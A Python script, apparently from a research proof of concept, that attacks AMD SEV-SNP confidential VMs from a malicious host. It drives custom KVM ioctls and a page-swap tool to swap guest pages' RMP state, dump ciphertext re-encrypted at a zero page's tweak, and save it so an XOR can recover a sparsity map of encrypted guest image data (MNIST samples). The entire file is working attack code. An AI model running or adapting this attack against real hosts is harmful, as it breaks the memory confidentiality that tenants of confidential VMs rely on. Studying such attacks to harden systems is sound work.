#!/usr/bin/env python3
"""
swap_and_dump.py — Dump an encrypted guest page via kernel-side swap+copy.

The kernel does forward swap + copies gfn1 ciphertext + backward swap,
all within one svm_vcpu_run() call before VMRUN.  The guest never sees
the inconsistent RMP state, eliminating KVM_SYSTEM_EVENT_SEV_TERM crashes.

Usage:
  sudo python3 swap_and_dump.py --image-gpa 0x... --zero-gpa 0x... \
      --label 3 --index 30 [--output-dir .] [--kvm-dev /dev/kvm]
"""

import argparse
import ctypes
import fcntl
import os
import subprocess
import sys

# ---------------------------------------------------------------------------
# ioctl numbers (must match host-kernel include/uapi/linux/kvm.h)
# ---------------------------------------------------------------------------

KVMIO     = 0xAE
PAGE_SIZE = 4096

def _ior(type_, nr, size):
    """Compute Linux _IOR(type, nr, size) ioctl number."""
    return (0x80000000 | ((size & 0x3FFF) << 16) | (type_ << 8) | nr)

KVM_USP_SWAP_STATUS = _ior(KVMIO, 0x2a, 4)          # uint32_t
KVM_READ_PAGE_DUMP  = _ior(KVMIO, 0x2b, PAGE_SIZE)  # uint8_t[4096]


# ---------------------------------------------------------------------------
# Kernel dump read
# ---------------------------------------------------------------------------

def read_page_dump(kvm_fd):
    """Read PAGE_SIZE bytes from kernel page_dump_buf via KVM_READ_PAGE_DUMP."""
    buf = ctypes.create_string_buffer(PAGE_SIZE)
    fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
    return bytes(buf)


def bytes_to_xp_dump(gpa_hex, raw_bytes):
    """Format PAGE_SIZE raw bytes as QEMU xp /512gx output lines."""
    gpa = int(gpa_hex, 0)
    lines = [f'(qemu) xp /512gx {gpa_hex}']
    for i in range(0, PAGE_SIZE, 16):
        addr = gpa + i
        lo = int.from_bytes(raw_bytes[i:i+8],    'little')
        hi = int.from_bytes(raw_bytes[i+8:i+16], 'little')
        lines.append(f'{addr:016x}: 0x{lo:016x} 0x{hi:016x}')
    return '\n'.join(lines)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument('--image-gpa',  required=True, help='Image page GPA (hex)')
    p.add_argument('--zero-gpa',   required=True, help='Zero page GPA (hex)')
    p.add_argument('--label',      required=True, type=int, help='MNIST label')
    p.add_argument('--index',      required=True, type=int, help='Dataset index')
    p.add_argument('--output-dir', default='.', help='Output directory (default: .)')
    p.add_argument('--output',     default=None, help='Output file path (overrides default naming)')
    p.add_argument('--kvm-dev',    default='/dev/kvm')
    p.add_argument('--swap-tool',
                   default=os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        'swap_pages_tool'))
    args = p.parse_args()

    os.makedirs(args.output_dir, exist_ok=True)

    print(f'image_gpa : {args.image_gpa}')
    print(f'zero_gpa  : {args.zero_gpa}')
    print(f'label={args.label}  index={args.index}')
    print()

    kvm_fd = os.open(args.kvm_dev, os.O_RDWR | os.O_CLOEXEC)

    try:
        # [1] Kernel does: forward swap → copy gfn1 ciphertext → backward swap,
        #     all before VMRUN.  Guest never sees the swapped RMP state.
        #     Argument order: <gfn1=zero_gpa> <gfn2=image_gpa> --swap-back
        print(f'[1/2] swap+copy+swap-back in kernel: '
              f'{args.zero_gpa} <-> {args.image_gpa}')
        rc = subprocess.run(
            [args.swap_tool, args.zero_gpa, args.image_gpa, '--swap-back']
        ).returncode
        if rc != 0:
            print(f'[!] swap_pages_tool exited {rc}', file=sys.stderr)
            sys.exit(1)

        # [2] Read the post-swap gfn1 ciphertext from the kernel buffer.
        #     This is image data re-encrypted at pfn_zero's AES-XTS tweak,
        #     so XOR with z.out (zeros at same tweak) yields the sparsity map.
        print(f'[2/2] reading page dump from kernel buffer...')
        raw  = read_page_dump(kvm_fd)
        dump = bytes_to_xp_dump(args.zero_gpa, raw)
        print(f'    {dump.count(chr(10))} lines')

    finally:
        os.close(kvm_fd)

    filename = f'{args.label}-{args.index}.out'
    out_path = args.output or os.path.join(args.output_dir, filename)
    with open(out_path, 'w') as f:
        f.write(dump + '\n')
    print(f'Saved: {out_path}')


if __name__ == '__main__':
    main()
